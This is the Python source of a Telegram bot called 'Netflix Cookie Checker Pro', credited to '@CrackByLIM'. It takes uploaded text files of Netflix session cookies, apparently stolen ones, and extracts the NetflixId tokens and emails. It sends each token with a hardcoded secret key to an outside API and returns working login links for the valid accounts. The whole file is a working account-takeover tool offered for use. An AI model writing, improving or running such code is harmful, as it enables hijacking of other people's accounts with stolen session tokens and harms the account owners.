import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI1D_cP642DCEw0bxnMLHSIFlGZQjVh1RgSPM"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== COOKIE EXTRACTOR - EXACT MATCH ====================

def extract_full_cookie(text):
    """Extract the FULL Netflix cookie exactly as it appears"""
    # Look for NetflixId= with the full value including all special characters
    patterns = [
        r'(NetflixId=v%3D3%26[^&\s\'"]+(?:%26[^&\s\'"]+)*)',  # Full NetflixId with all params
        r'NetflixId=([^&\s\'"]+)',  # Just the value
        r'[Cc]ookie.*?[=:].*?(NetflixId=[^\s\'"]+)',  # Inside Cookie field
        r'(NetflixId=[a-zA-Z0-9%._-]+(?:%[0-9A-F]{2})*)',  # With URL encoding
    ]
    
    for pattern in patterns:
        match = re.search(pattern, text)
        if match:
            full_cookie = match.group(1).strip()
            # Clean up any trailing punctuation
            full_cookie = re.sub(r'[.,;:\'")\]}]+$', '', full_cookie)
            logger.info(f"✅ Extracted cookie: {full_cookie[:50]}...")
            return full_cookie
    return None

def extract_netflix_id_from_cookie(cookie):
    """Extract just the NetflixId value from the full cookie"""
    match = re.search(r'NetflixId=([^&\s]+)', cookie)
    if match:
        return match.group(1).strip()
    return None

def extract_email(text):
    """Extract email from text"""
    match = re.search(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})', text)
    return match.group(1).strip() if match else None

def extract_field(text, field_names):
    """Extract field by multiple possible names"""
    for field_name in field_names:
        # Look for patterns like "Name: value" or "Name = value"
        pattern = rf'{re.escape(field_name)}[:\s=]+([^\n\r]+)'
        match = re.search(pattern, text, re.IGNORECASE)
        if match:
            value = match.group(1).strip()
            # Clean up emojis and special characters
            value = re.sub(r'[^\x00-\x7F]+', '', value).strip()
            return value
    return None

def parse_account(text):
    """Parse a single account - focuses on getting the FULL cookie"""
    try:
        account = {}
        
        # STEP 1: Extract the FULL cookie (most important)
        full_cookie = extract_full_cookie(text)
        if not full_cookie:
            logger.warning("❌ No cookie found in text")
            return None
        
        account['full_cookie'] = full_cookie
        
        # STEP 2: Extract NetflixId value
        netflix_id = extract_netflix_id_from_cookie(full_cookie)
        if netflix_id:
            account['netflix_id'] = netflix_id
            logger.info(f"✅ Found NetflixId: {netflix_id[:30]}...")
        
        # STEP 3: Extract email
        email = extract_email(text)
        if email:
            account['email'] = email
        else:
            account['email'] = f"user_{netflix_id[:8] if netflix_id else 'unknown'}@account.com"
        
        # STEP 4: Extract other fields (optional)
        name = extract_field(text, ['Name', 'Nombre', 'Nome', '名前'])
        if name:
            account['name'] = name
        
        country = extract_field(text, ['Country', 'País', 'Pais', '国'])
        if country:
            account['country'] = country
        
        plan = extract_field(text, ['Plan', 'Plano', 'プラン'])
        if plan:
            account['plan'] = plan
        
        # STEP 5: Look for direct URL
        url_match = re.search(r'(https?://[^\s]+nftoken=[^\s]+)', text)
        if url_match:
            account['direct_url'] = url_match.group(1).strip()
        
        return account
        
    except Exception as e:
        logger.error(f"Error parsing account: {e}")
        return None

def split_into_accounts(content):
    """Split file content into individual accounts"""
    # Try to split by common separators
    separators = [
        '----------------------------------------',
        '════════════════════════════════════════',
        '────────────────────────────────────────',
        '========================================',
        '----------',
        '\n\n\n',
    ]
    
    for sep in separators:
        if sep in content:
            accounts = content.split(sep)
            return [acc.strip() for acc in accounts if acc.strip() and 'NetflixId=' in acc]
    
    # If no separator, try to split by "ACCOUNT" headers
    lines = content.split('\n')
    accounts = []
    current = []
    
    for line in lines:
        if re.search(r'(?:ACCOUNT|Account|PREMIUM)\s*#?\d+', line, re.IGNORECASE):
            if current:
                accounts.append('\n'.join(current))
                current = [line]
            else:
                current = [line]
        elif current:
            current.append(line)
        elif 'NetflixId=' in line and not current:
            current = [line]
    
    if current:
        accounts.append('\n'.join(current))
    
    # If still no accounts, just return lines that contain NetflixId
    if not accounts:
        accounts = [line for line in lines if 'NetflixId=' in line]
    
    return accounts

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email, full_cookie=None):
    """Check Netflix ID using YOUR API - exactly like working bots do"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID",
            "email": email
        }
    
    try:
        # YOUR API endpoint
        url = f"{API_URL}/api/gen"
        
        # Send exactly what your API expects
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        # If we have the full cookie, include it (some APIs need this)
        if full_cookie:
            data["cookie"] = full_cookie
        
        logger.info(f"📡 Calling YOUR API for {email}")
        logger.info(f"🔑 Using Netflix ID: {netflix_id[:30]}...")
        
        response = requests.post(url, json=data, timeout=15)
        
        try:
            result = response.json()
            logger.info(f"📥 API Response: {result}")
        except:
            return {
                "success": False,
                "error": "Invalid API response",
                "email": email
            }
        
        # Check YOUR API's response format
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                logger.info(f"✅ API SUCCESS for {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "data": result
                }
        
        # Handle error responses
        error_msg = result.get('error', 'Unknown error')
        error_code = result.get('error_code', 'UNKNOWN')
        
        logger.warning(f"❌ API Error for {email}: {error_msg} ({error_code})")
        
        return {
            "success": False,
            "error": error_msg,
            "error_code": error_code,
            "email": email
        }
        
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API timeout",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API",
            "email": email
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "email": email
        }

# ==================== TEST API COMMAND ====================

async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if YOUR API is working"""
    await update.message.reply_text("🔄 Testing YOUR API connection...")
    
    try:
        # Test with a simple request to your API
        response = requests.get(API_URL, timeout=5)
        
        if response.status_code == 200:
            await update.message.reply_text(
                f"✅ **YOUR API IS ONLINE!**\n\n"
                f"**API URL:** `{API_URL}`\n"
                f"**Status:** Connected\n\n"
                f"Now try uploading a .txt file with valid cookies.",
                parse_mode='Markdown'
            )
        else:
            await update.message.reply_text(
                f"⚠️ **API returned status code: {response.status_code}**",
                parse_mode='Markdown'
            )
    except Exception as e:
        await update.message.reply_text(
            f"❌ **Cannot connect to YOUR API**\n\nError: `{str(e)}`",
            parse_mode='Markdown'
        )

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX COOKIE CHECKER PRO 🎬   ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with Netflix cookies
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

📋 **I will:**
✅ Extract Netflix cookies from ANY format
✅ Check each cookie with YOUR API
✅ Send working login links
✅ Show detailed results

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/testapi - Test YOUR API
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • ANY format is accepted!
   • Must contain Netflix cookies
   • One or multiple accounts

2️⃣ **Send the file to me**
   • I'll extract ALL cookies
   • Check each with YOUR API
   • Only VALID cookies get login links

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **SUPPORTED FORMATS:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
✓ `NetflixId=v%3D3%26ct%3D...`
✓ `Cookie: NetflixId=v%3D3%26ct%3D...`
✓ `馃崻 Cookie: NetflixId=...` (emoji)
✓ Any text containing NetflixId=

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/testapi - Test YOUR API
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid:** `{valid_accounts}`
• **❌ Invalid:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text("✅ Session cleared. You can upload a new file.")

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text("⏰ Too many requests. Please wait a minute.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into individual accounts
        accounts = split_into_accounts(content)
        
        if not accounts:
            await status_msg.edit_text("❌ No Netflix cookies found in file.")
            return
        
        await status_msg.edit_text(f"📊 Found {len(accounts)} potential accounts. Checking with YOUR API...")
        
        valid_count = 0
        invalid_count = 0
        valid_accounts_list = []
        
        for i, account_text in enumerate(accounts, 1):
            # Parse account to extract cookie
            account = parse_account(account_text)
            
            if not account:
                invalid_count += 1
                continue
            
            # Update progress
            if i % 2 == 0 or i == len(accounts):
                await status_msg.edit_text(f"🔄 Checking account {i}/{len(accounts)}... (Valid: {valid_count})")
            
            # Get the Netflix ID
            netflix_id = account.get('netflix_id')
            email = account.get('email', f"account{i}@unknown.com")
            full_cookie = account.get('full_cookie')
            
            if not netflix_id:
                invalid_count += 1
                continue
            
            # Check with YOUR API
            result = await check_with_your_api(netflix_id, email, full_cookie)
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                valid_accounts_list.append({
                    'email': email,
                    'login_url': result['login_url'],
                    'name': account.get('name', ''),
                    'country': account.get('country', ''),
                    'plan': account.get('plan', '')
                })
                
                # Send each valid account immediately
                name_display = f" • **Name:** {account['name']}\n" if account.get('name') else ""
                country_display = f" • **Country:** {account['country']}\n" if account.get('country') else ""
                plan_display = f" • **Plan:** {account['plan']}\n" if account.get('plan') else ""
                
                msg = f"""
✅ **VALID ACCOUNT FOUND!**

📧 **Email:** `{email}`
{name_display}{country_display}{plan_display}
🔗 **Login Link:** `{result['login_url']}`

⚡ {YOUR_CREDIT}
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=result['login_url'])]]
                await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
                
            else:
                invalid_count += 1
                invalid_accounts += 1
            
            # Small delay to avoid rate limits
            await asyncio.sleep(0.5)
        
        # Final summary
        if valid_accounts_list:
            await status_msg.edit_text(
                f"✅ **Complete!** Found {valid_count} valid accounts.\n"
                f"All valid accounts have been sent above."
            )
        else:
            await status_msg.edit_text(
                f"❌ **No valid accounts found.**\n"
                f"Checked {len(accounts)} accounts, all invalid or expired."
            )
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX COOKIE CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("testapi", test_api_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()
